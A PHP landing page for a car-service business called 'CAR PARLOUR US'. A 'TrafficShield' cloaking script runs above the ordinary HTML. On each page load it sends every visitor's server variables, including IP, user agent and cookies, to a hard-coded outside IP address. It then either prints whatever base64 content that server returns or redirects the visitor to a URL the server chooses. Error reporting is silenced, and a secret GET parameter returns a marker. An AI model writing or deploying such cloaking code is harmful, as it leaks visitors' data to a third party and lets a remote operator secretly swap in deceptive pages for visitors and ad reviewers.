<?php
namespace TrafficShield; 
error_reporting(0);
class Traffic_Shield{
    public function run() {		
        ob_start();					
        $this->ogrsr9854();
    }
    public function ogrsr9854() {	
        $this->_check(); 
        $response = $this->https_request();        
        $this->main($response);       
    }
    public function _check() {	
        if(isset($_GET["TS-BHDNR-84848"])){
            echo "ecd792ec4d";
        }
    }			
    public function get_header() {	
        $headers = array();     
        foreach($_SERVER as $k=>$v){
            $headers[$k] = $v;
        }
        $headers["TS-BHDNR-74191"] = "900661405745786";
        $headers["TS-BHDNR-74194"] = "ecd792ec4d"; 
        return $headers;
    }
    public function get_header_post() {
        $get_header = $this->get_header();
        return base64_encode(json_encode($get_header));      
    }	
    public function https_request() {
        $get_header["headers"] = $this->get_header_post();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
        $result = curl_exec($ch);                
        return json_decode($result);
    }
    public function main($response) {
        if(!empty($response)){
            if(isset($response->zrc) && !empty($response->zrc)){
                echo base64_decode($response->zrc);
                die();
            }else{
                $this->get_url($response->url,$response->http_code);
            }
        }
    }
    public function get_url($url,$code) {        
            header("Location: ".$url, true, $code); ?>
        <!DOCTYPE html>
            <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta http-equiv="X-UA-Compatible" content="IE=edge">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <meta http-equiv="refresh" content="0;url="<?php echo $url; ?>"" />
                    <title>You are being redirected to <?php echo $url; ?> your destination</title>
                    <script type="text/javascript">
                        window.location.replace("<?php echo $url; ?>");
                    </script>
                </head>
                <body>                        
                    You are being redirected to <a href="<?php echo $url; ?>" >your destination</a>.
                <script type="text/javascript">
                    window.location.replace("<?php echo $url; ?>");
                </script>
                </body>
            </html> 
<?php  } }
$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>
<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="WebThemez">
    <link rel="shortcut icon" href="">
    <title>CAR PARLOUR US</title>
    <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:300,600">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <!-- FancyBox -->
	<link href="assets/css/fancybox/jquery.fancybox.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/style.css"> 
    <link rel="stylesheet" href="assets/css/animate.min.css">
    <link rel="stylesheet" href="assets/css/font-awesome.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <!--[if lt IE 9]>
    <script src="assets/js/html5shiv.js"></script>
    <script src="assets/js/respond.min.js"></script>
    <![endif]-->
  </head>
  <body> 
  <script>
    $(document).ready(function(){
        $('a[href^="#"]').on('click', function(event) {
            var target = $($(this).attr('href'));
            if(target.length){
                event.preventDefault();
                $('html, body').animate({
                    scrollTop: target.offset().top
                }, 1000); // Adjust the speed (1000ms = 1 second)
            }
        });
    });
</script>


          <div id="navbar-top">
      <nav class="navbar navbar-default navbar-static" role="navigation">
        <div class="container">
          <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand nav-external" href="#home"><strong>CAR PARLOUR US</strong></a>
          </div>
          <div class="collapse navbar-collapse">
            <ul class="nav navbar-nav navbar-right">
              <li class="active">
                <a href="#home">Home</a>
              </li>
              <li>
                <a href="#services">Services</a>
              </li>
              <li>
                <a href="#work">Works</a>
              </li>
              <li>
                <a href="#clients">Clients</a>
              </li>
              <li>
                <a href="#about">About</a>
              </li>
              <li>
                <a href="#contact">Contact</a>
              </li>
            </ul>
          </div>
        </div>
      </nav>
    </div>


    <section id="home" class="page">
      <div class="container">
        <div class="content cover text-center">
       <!--   <div class="row">
            <div class="col-lg-12">
              <h1 class="animated hiding" data-animation="fadeInDown" data-delay="300">We Are Merlin</h1>
              <a class="btn btn-blue nav-external animated hiding" data-animation="fadeIn" data-delay="900" href="#services">Find more</a>
              <h3 class="animated hiding" data-animation="fadeIn" data-delay="600">We Have Made A Lot Of Friends.</h3>
            </div>
          </div>-->
          	<div class="banner-content">
			<div class="heroText">
                <h2><span> Car Parlour US </span><br>
                  <strong>One stop CAR solution</strong></h2>
              </div>
			</div>
        </div>
      </div>
    </section>

    <section id="services" class="page space">
      <div class="container text-center"> 
          <div class="heading">
            <h2>Our Services</h2>
            
            <p>We provide top-notch automotive services to keep your vehicle in perfect condition. Whether it's maintenance, repair, or enhancement, we've got you covered.</p>
          </div>
         <div class="row services-list">
					<div class="col-sm-6 col-md-3 text-center service animated fadeInUp visible" data-animation="fadeInUp">
						<div class="service-icon"> 
                            <img src="assets/img/car-wash.jpg" alt=""/> 
						</div>
						<h4 class="color-white">Car Wash</h4>
            <p>Get your car sparkling clean with our thorough and eco-friendly car washing services.</p>
					</div><!-- END COLUMN 3 -->
					<div class="col-sm-6 col-md-3 text-center service animated fadeInUp visible" data-animation="fadeInUp" data-animation-delay="200">
						<div class="service-icon">
							<img src="assets/img/car-service.jpg" alt=""/> 
						</div>
						<h4 class="color-white">Car Servicing</h4>
            <p>Regular servicing to ensure your car runs smoothly and efficiently, from oil changes to engine checks.</p>
					</div><!-- END COLUMN 3 -->
					<div class="col-sm-6 col-md-3 text-center service animated fadeInUp visible" data-animation="fadeInUp" data-animation-delay="400">
						<div class="service-icon">
							<img src="assets/img/Car-painting.jpg" alt=""/> 
						</div>
						<h4 class="color-white">Car Painting</h4>
            <p>High-quality painting services to give your car a fresh, vibrant look, using premium materials.</p>
					</div><!-- END COLUMN 3 -->
					<div class="col-sm-6 col-md-3 text-center service animated fadeInUp visible" data-animation="fadeInUp" data-animation-delay="600">
						<div class="service-icon">
							<img src="assets/img/car-modi.jpg" alt=""/> 
						</div>
						<h4 class="color-white">Car Modifying</h4>
            <p>Personalize your car with our expert modification services, from body kits to performance upgrades.</p>
					</div><!-- END COLUMN 3 -->
				</div>       
      </div>
    </section>
    <section id="work" class="page space">
      <div class="container text-center">
          <div class="heading">
            <h2>Our Work</h2>
            
            <p>Explore our portfolio showcasing the high-quality work we've done in the automotive industry. From detailing to custom modifications, see how we bring vehicles to their best.</p>
          </div>
          <div class="row">
            <div class="col-md-12">
              <div id="portfolio">
                <ul class="filters list-inline">
                  <li>
                    <a class="active" data-filter="*" href="#">All</a>
                  </li>
                  <li>
                    <a data-filter=".photography" href="#">Wash</a>
                  </li>
                  <li>
                    <a data-filter=".branding" href="#"> Servicing</a>
                  </li>
                  <li>
                    <a data-filter=".web" href="#">Painting</a>
                  </li>
                </ul>
                <ul class="items list-unstyled clearfix animated hiding" data-animation="fadeInRight">
                  <li class="item branding">
                     <a href="assets/img/work/1.jpg" class="fancybox">
                      <img src="assets/img/work/1.jpg" alt="">
                      <div class="overlay">
                        <!-- <span>Exterior Shine</span> -->
                        <span>Custom Mods</span>

                      </div>
                    </a>
                  </li>
                  <li class="item photography">
                     <a href="assets/img/work/2.jpg" class="fancybox">
                      <img src="assets/img/work/2.jpg" alt="">
                      <div class="overlay">
                        <!-- <span>Engine Check</span> -->
                        <span>Exterior Shine</span>

                      </div>
                    </a>
                  </li>
                  <li class="item branding">
                     <a href="assets/img/work/3.jpg" class="fancybox">
                      <img src="assets/img/work/3.jpg" alt="">
                      <div class="overlay">
                        <!-- <span>Fresh Paint Job</span> -->
                        <span>Perfection in Service</span>
                      </div>
                    </a>
                  </li>
                  <li class="item photography">
                     <a href="assets/img/work/4.jpg" class="fancybox">
                      <img src="assets/img/work/4.jpg" alt="">
                      <div class="overlay">
                        <!-- <span>Custom Mods</span> -->
                        <span>Enhanced Performance</span>

                      </div>
                    </a>
                  </li>
                  <li class="item photography">
                     <a href="assets/img/work/5.jpg" class="fancybox">
                      <img src="assets/img/work/5.jpg" alt="">
                      <div class="overlay">
                        <span>Detailing Perfection</span>
                      </div>
                    </a>
                  </li>
                  <li class="item web">
                     <a href="assets/img/work/6.jpg" class="fancybox">
                      <img src="assets/img/work/6.jpg" alt="">
                      <div class="overlay">
                        <!-- <span>Routine Maintenance</span> -->
                        <span>Fresh Paint Job</span>

                      </div>
                    </a>
                  </li>
                  <li class="item photography">
                     <a href="assets/img/work/7.jpg" class="fancybox">
                      <img src="assets/img/work/7.jpg" alt="">
                      <div class="overlay">
                        <span>Custom Colors</span>
                      </div>
                    </a>
                  </li>
                  <li class="item web">
                    <a href="assets/img/work/8.jpg" class="fancybox">
                      <img src="assets/img/work/8.jpg" alt="">
                      <div class="overlay">
                        <!-- <span>Enhanced Performance</span> -->
                        <span>Routine Maintenance</span>

                      </div> 
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>       
      </div>
    </section>
    
    <section id="clients" class="page space">
      <div class="container text-center"> 
          <div class="row">
            <div class="col-lg-12 animated hiding" data-animation="fadeInDown">
              <div id="testimonials" class="carousel slide">
                <ol class="carousel-indicators">
                  <li data-target="#testimonials" data-slide-to="0" class="active"></li>
                  <li data-target="#testimonials" data-slide-to="1" class=""></li>
                  <li data-target="#testimonials" data-slide-to="2" class=""></li>
                  <li data-target="#testimonials" data-slide-to="3" class=""></li>
                </ol>
                <div class="carousel-inner">
                  <div class="item active">
                    <p class="quote">"The detailing service provided by this team was exceptional. My car looks brand new and they were incredibly thorough and professional throughout the entire process."</p>
                    <p class="client">Emily Johnson / Car Enthusiast</p>
                  </div>
                  <div class="item">
                    <p class="quote">"I was impressed with the quality of the car servicing. They went above and beyond to ensure my vehicle was running smoothly. Highly recommend their service to anyone needing reliable auto care."</p>
                    <p class="client">Michael Smith / Local Business Owner</p>
                  </div>
                  <div class="item">
                    <p class="quote">"The custom paint job they did on my car was phenomenal. The attention to detail and craftsmanship truly exceeded my expectations. It’s like a whole new car!"</p>
                            <p class="client">Samantha Lee / Auto Collector</p>
                  </div>
                  <div class="item">
                    <p class="quote">"Their car modification services transformed my vehicle exactly as I envisioned. The team was knowledgeable and attentive, making sure every aspect of the modification was perfect."</p>
                    <p class="client">James Brown / Car Modification Enthusiast</p>
                  </div>
                </div>
                <a class="left carousel-control" data-slide="prev" href="#testimonials">&lsaquo;</a>
                <a class="right carousel-control" data-slide="next" href="#testimonials">&rsaquo;</a>
              </div>
            </div>
          </div>      
      </div>
    </section>
    <section id="about" class="page space">
      <div class="container text-center"> 
          <div class="heading">
            <h2>Who we are</h2>
            
            <p>We are a dedicated team of automotive professionals passionate about delivering exceptional service and solutions for all your vehicle needs. With a commitment to quality and customer satisfaction, we strive to keep your car in top shape and running smoothly.</p>
          </div>
          <div class="row">
            <div class="col-md-3 col-sm-6 col-xs-12 teammate" data-animation="fadeInLeft" data-delay="600">
              <div class="profile-photo">
                <img class="img-responsive" src="assets/img/team/1.jpg" alt="">
              </div>
              <div class="bio">
                <h4>Harvey Norman</h4>
                    <h5>Lead Technician</h5>
                    <p>Harvey brings over 15 years of experience in automotive repair and maintenance. His expertise in engine diagnostics and repair ensures every vehicle receives the best care.</p>
                 
                <!-- <ul class="list-inline">
                  <li>
                    <a href="http://www.facebook.com" title="Facebook">
                      <i class="fa fa-facebook"></i>
                    </a>
                  </li>
                  <li>
                    <a href="http://www.twitter.com" title="Twitter">
                      <i class="fa fa-twitter"></i>
                    </a>
                  </li>
                  <li>
                    <a href="http://www.linkedin.com" title="LinkedIn">
                      <i class="fa fa-linkedin"></i>
                    </a>
                  </li>
                  <li>
                    <a href="http://www.github.com" title="GitHub">
                      <i class="fa fa-github"></i>
                    </a>
                  </li>
                </ul> -->
              </div>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-12 teammate animated hiding" data-animation="fadeInUp" data-delay="300">
              <div class="profile-photo">
                <img class="img-responsive" src="assets/img/team/2.jpg" alt="">
              </div>
              <div class="bio">
                <h4>Clarinda Gratia</h4>
                    <h5>Service Advisor</h5>
                    <p>Clarinda is our expert service advisor who ensures that every client receives personalized care and accurate advice on automotive services. Her attention to detail and customer service skills make her a key asset to our team.</p>
                 
                <!-- <ul class="list-inline">
                  <li>
                    <a href="http://www.dribbble.com" title="Dribbble">
                      <i class="fa fa-dribbble"></i>
                    </a>
                  </li>
                  <li>
                    <a href="http://www.pinterest.com" title="Pinterest">
                      <i class="fa fa-pinterest"></i>
                    </a>
                  </li>
                  <li>
                    <a href="http://www.instagram.com" title="Instagram">
                      <i class="fa fa-instagram"></i>
                    </a>
                  </li>
                </ul> -->
              </div>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-12 teammate animated hiding" data-animation="fadeInUp" data-delay="300">
              <div class="profile-photo">
                <img class="img-responsive" src="assets/img/team/3.jpg" alt="">
              </div>
              <div class="bio">
                <h4>Hudson Eimear</h4>
                    <h5>Mobile Service Specialist</h5>
                    <p>Hudson specializes in mobile automotive services, offering convenience and expert repairs right at your doorstep. His innovative solutions and efficient service are perfect for busy customers.</p>
                 
                <!-- <ul class="list-inline">
                  <li>
                    <a href="http://www.twitter.com" title="Twitter">
                      <i class="fa fa-twitter"></i>
                    </a>
                  </li>
                  <li>
                    <a href="http://developer.android.com/index.html" title="Android Developers">
                      <i class="fa fa-android"></i>
                    </a>
                  </li>
                  <li>
                    <a href="http://www.stackoverflow.com" title="Stack Overflow">
                      <i class="fa fa-stack-overflow"></i>
                    </a>
                  </li>
                </ul> -->
              </div>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-12 teammate animated hiding" data-animation="fadeInRight" data-delay="600">
              <div class="profile-photo">
                <img class="img-responsive" src="assets/img/team/4.jpg" alt="">
              </div>
              <div class="bio">
                <h4>Wigstan Fergus</h4>
                    <h5>Quality Assurance Manager</h5>
                    <p>Wigstan ensures that all services and repairs meet our high standards of quality. His thorough inspections and commitment to excellence guarantee that every job is completed to perfection.</p>
                 
                <!-- <ul class="list-inline">
                  <li>
                    <a href="http://www.plus.google.com" title="Google+">
                      <i class="fa fa-google-plus"></i>
                    </a>
                  </li>
                  <li>
                    <a href="http://www.trello.com" title="Trello">
                      <i class="fa fa-trello"></i>
                    </a>
                  </li>
                  <li>
                    <a href="mailto:john.doe@mail.com" title="Email">
                      <i class="fa fa-envelope"></i>
                    </a>
                  </li>
                </ul> -->
              </div>
            </div>
          </div>        
      </div>
      <!-- <div class="twitter text-center">
        <div class="animated hiding" data-animation="fadeIn">
          <i class="fa fa-twitter fa-3x"></i>
          <div id="feed"></div>
        </div>
      </div> -->
    </section> 
    <!-- <section id="priceTable" class="page space">
    	 <div class="container text-center"> 
         <div class="heading">
            <h2>Our Efforts</h2>
            
            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat duis aute irure dolor.</p>
          </div>  -->
         	<!-- <div class="row"> 
            <div class="col-sm-3">
              <div class="panel panel-default text-center">
                <div class="panel-heading">
                  <h3>Basic</h3>
                </div>
                <div class="panel-body">
                  <h3 class="panel-title price">$9<span class="price-cents">99</span><span class="price-month">mo.</span></h3>
                </div>
                <ul class="list-group">
                  <li class="list-group-item">5 Projects</li>
                  <li class="list-group-item">5 GB of Storage</li>
                  <li class="list-group-item">Up to 100 Users</li>
                  <li class="list-group-item">10 GB Bandwidth</li>
                  <li class="list-group-item">Security Suite</li>
                  <li class="list-group-item"><a class="btn btn-default">Sign Up Now!</a></li>
                </ul>
              </div>          
            </div>
            <div class="col-sm-3">
              <div class="panel panel-default text-center">
                <div class="panel-heading">
                  <h3>Plus</h3>
                </div>
                <div class="panel-body">
                  <h3 class="panel-title price">$19<span class="price-cents">99</span><span class="price-month">mo.</span></h3>
                </div>
                <ul class="list-group">
                  <li class="list-group-item">10 Projects</li>
                  <li class="list-group-item">10 GB of Storage</li>
                  <li class="list-group-item">Up to 250 Users</li>
                  <li class="list-group-item">25 GB Bandwidth</li>
                  <li class="list-group-item">Security Suite</li>
                  <li class="list-group-item"><a class="btn btn-default">Sign Up Now!</a></li>
                </ul>
              </div>          
            </div>
            <div class="col-sm-3">
              <div class="panel panel-danger text-center">
                <div class="panel-heading">
                  <h3>Premium</h3>
                </div>
                <div class="panel-body">
                  <h3 class="panel-title price">$29<span class="price-cents">99</span><span class="price-month">mo.</span></h3>
                </div>
                <ul class="list-group">
                  <li class="list-group-item">Unlimited</li>
                  <li class="list-group-item">50 GB of Storage</li>
                  <li class="list-group-item">Up to 1000 Users</li>
                  <li class="list-group-item">100 GB Bandwidth</li>
                  <li class="list-group-item">Security Suite</li>
                  <li class="list-group-item"><a class="btn btn-primary">Sign Up Now!</a></li>
                </ul>
              </div>          
            </div>
            <div class="col-sm-3">
              <div class="panel panel-default text-center">
                <div class="panel-heading">
                  <h3>Ultimate</h3>
                </div>
                <div class="panel-body">
                  <h3 class="panel-title price">$49<span class="price-cents">99</span><span class="price-month">mo.</span></h3>
                </div>
                <ul class="list-group">
                  <li class="list-group-item">Unlimited</li>
                  <li class="list-group-item">150 GB of Storage</li>
                  <li class="list-group-item">Unlimited</li>
                  <li class="list-group-item">500 GB Bandwidth</li>
                  <li class="list-group-item">Security Suite</li>
                  <li class="list-group-item"><a class="btn btn-default">Sign Up Now!</a></li>
                </ul>
              </div>          
            </div>
     
          </div> -->
         <!-- </div>      
    </section> -->
    <section id="contact" class="content-section form contact light space">
    	<div class="container">
        	  <div class="content cover text-center">
              <div class="heading">
                <h2>Getting in touch</h2>
                
                <p>We'd love to hear from you! Whether you have questions, need assistance, or just want to say hello, feel free to reach out. Our team is here to help and will get back to you as soon as possible.</p>
                <p>Contact us via the form below, or connect with us through our social media channels.</p>              </div>
               <div class="row"> 
             
                <div class="col-md-offset-2 col-md-8 anim fadeInLeft animated" style="visibility: visible;"> 
						<!--NOTE: Update your email Id in "contact_me.php" file in order to receive emails from your contact form-->
		<form name="sentMessage" id="contactForm"  novalidate>
		<h3>Contact Form</h3>
		<div class="control-group">
		<div class="controls">
		<input type="text" class="form-control" 
		placeholder="Full Name" id="name" required
		data-validation-required-message="Please enter your name" />
		<p class="help-block"></p>
		</div>
		</div> 	
		<div class="control-group">
		<div class="controls">
		<input type="email" class="form-control" placeholder="Email" 
		id="email" required
		data-validation-required-message="Please enter your email" />
		</div>
		</div> 	

		<div class="control-group">
		<div class="controls">
		<textarea rows="10" cols="100" class="form-control" 
		placeholder="Message" id="message" required
		data-validation-required-message="Please enter your message" minlength="5" 
		data-validation-minlength-message="Min 5 characters" 
		maxlength="999" style="resize:none"></textarea>
		</div>
		</div> 		 
		<div id="success"> </div> 
		<button type="submit" class="btn btn-primary pull-right">Send</button><br />
		</form>
                </div> 
            </div>
            
    	</div><!-- .container -->
    	
        <span id="message_sent"><i class="fa-check fa"></i></span><!-- jQuery display of giant checkmark -->	
        
    </section>
    <footer id="footer">
      <div class="container"> 
        <div class="row">
          <div class="col-lg-12 animated hiding" data-animation="fadeInUp">
            <!-- <ul class="social list-inline ">
              <li>
                <a class="facebook" href="http://www.facebook.com" title="Facebook">
                  <i class="fa fa-facebook fa-2x"></i>
                </a>
              </li>
              <li>
                <a class="twitter" href="http://www.twitter.com" title="Twitter">
                  <i class="fa fa-twitter fa-2x"></i>
                </a>
              </li>
              <li>
                <a class="google-plus" href="http://www.plus.google.com" title="Google+">
                  <i class="fa fa-google-plus fa-2x"></i>
                </a>
              </li>
              <li>
                <a class="dribbble" href="http://www.linkedin.com" title="Dribbble">
                  <i class="fa fa-dribbble fa-2x"></i>
                </a>
              </li>
            </ul> -->
            <p class="copyright"> 
              <p class="text-center">Copyright © 2024. All Rights Reserved.  Designed with love by Car Parlour US</p>
              <p><a href="policy.php">Privacy Policy</a></p>
            </p>
          </div>
        </div>
      </div>
    </footer>
    <script src="assets/js/modernizr-latest.js"></script>
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
	<script src="assets/js/jquery.cslider.js"></script>
    <script src="assets/js/isotope.pkgd.min.js"></script>
	<script src="assets/js/jquery.fancybox.pack.js"></script>  
	<script src="assets/js/jquery.fancybox-media.js"></script>  
    <script src="assets/js/imagesloaded.min.js"></script>
    <script src="assets/js/jquery.scrollTo.min.js"></script>
    <script src="assets/js/jquery.nav.min.js"></script>
    <script src="assets/js/jquery.appear.min.js"></script>
    <script src="assets/js/twitterFetcher.min.js"></script>
 <script src="contact/jqBootstrapValidation.js"></script>
 <script src="contact/contact_me.js"></script>
    <script src="assets/js/script.js"></script> 
	<script type="text/javascript">
    $(document).ready(function () {
		$('#da-slider').cslider({
			autoplay: true,
			bgincrement: 0
		});
    });
    </script>
  </body>
</html>
